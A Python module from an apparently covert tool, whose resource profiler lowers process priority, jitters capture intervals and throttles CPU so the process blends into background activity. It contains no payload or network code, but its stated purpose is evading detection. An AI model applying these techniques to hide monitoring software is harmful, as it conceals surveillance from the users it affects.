"""
Resource-usage stealth profiler.

Ensures the process's CPU, memory, and I/O patterns are indistinguishable
from background noise by:

  - Lowering scheduling priority (``os.nice``, ``IDLE_PRIORITY_CLASS``)
  - Adding Gaussian jitter to capture intervals
  - Self-monitoring CPU usage and inserting micro-pauses
  - Idle mimicry (near-zero CPU when no user activity)

Usage::

    from stealth.resource_profiler import ResourceProfiler

    profiler = ResourceProfiler(config)
    profiler.apply_priority()
    interval = profiler.jittered_interval(30.0)
    profiler.enforce_cpu_ceiling()
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import random
import time
from typing import Any

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


class ResourceProfiler:
    """Manages resource-usage stealth.

    Parameters
    ----------
    config : dict
        The ``stealth.resources`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._cpu_jitter_factor: float = float(cfg.get("cpu_jitter_factor", 0.3))
        self._cpu_ceiling: float = float(cfg.get("cpu_ceiling", 15.0))
        self._io_spread: bool = bool(cfg.get("io_spread", True))
        self._idle_sleep_interval: float = float(cfg.get("idle_sleep_interval", 30.0))
        self._platform = _get_platform()
        self._process: Any = None  # psutil.Process lazy-init
        self._priority_applied = False

    # ── Public API ───────────────────────────────────────────────────

    def apply_priority(self) -> None:
        """Drop the process to lowest scheduling priority."""
        if self._priority_applied:
            return

        if self._platform in ("linux", "darwin"):
            try:
                os.nice(19)
                logger.debug("Process priority lowered (nice 19)")
            except OSError:
                # May fail if already at lowest priority
                pass
        elif self._platform == "windows":
            try:
                IDLE_PRIORITY_CLASS = 0x00000040
                kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
                handle = kernel32.GetCurrentProcess()
                kernel32.SetPriorityClass(handle, IDLE_PRIORITY_CLASS)
                logger.debug("Process priority lowered (IDLE_PRIORITY_CLASS)")
            except Exception:
                pass

        self._priority_applied = True

    def jittered_interval(self, base_interval: float) -> float:
        """Return *base_interval* with Gaussian jitter applied.

        Gaussian distribution is less detectable than uniform because it
        produces natural-looking timing variations centred on the base.
        """
        sigma = base_interval * self._cpu_jitter_factor
        jittered = random.gauss(base_interval, sigma)
        # Clamp to [50% .. 200%] of base to avoid extremes
        return max(base_interval * 0.5, min(jittered, base_interval * 2.0))

    def enforce_cpu_ceiling(self) -> None:
        """Check CPU usage and sleep briefly if above the ceiling.

        Should be called periodically in the main loop.
        """
        cpu_pct = self._get_cpu_percent()
        if cpu_pct is None:
            return

        if cpu_pct > self._cpu_ceiling:
            # Proportional back-off: higher overshoot → longer pause
            overshoot = cpu_pct - self._cpu_ceiling
            pause = min(0.5, overshoot / 100.0)
            time.sleep(pause)

    def idle_sleep(self) -> None:
        """Sleep for the idle interval — call when no user activity detected."""
        time.sleep(self._idle_sleep_interval)

    def get_io_spread_delay(self) -> float:
        """Return a small random delay for spreading I/O operations."""
        if not self._io_spread:
            return 0.0
        return random.uniform(0.01, 0.1)

    def get_status(self) -> dict[str, Any]:
        """Return current resource profiler status."""
        cpu_pct = self._get_cpu_percent()
        return {
            "priority_applied": self._priority_applied,
            "cpu_percent": cpu_pct,
            "cpu_ceiling": self._cpu_ceiling,
            "jitter_factor": self._cpu_jitter_factor,
            "io_spread": self._io_spread,
        }

    # ── Internals ────────────────────────────────────────────────────

    def _get_cpu_percent(self) -> float | None:
        """Get current process CPU percentage via psutil."""
        try:
            if self._process is None:
                import psutil
                self._process = psutil.Process()
                # First call returns 0; need interval
                self._process.cpu_percent(interval=None)
                return None

            return self._process.cpu_percent(interval=None)
        except Exception:
            return None
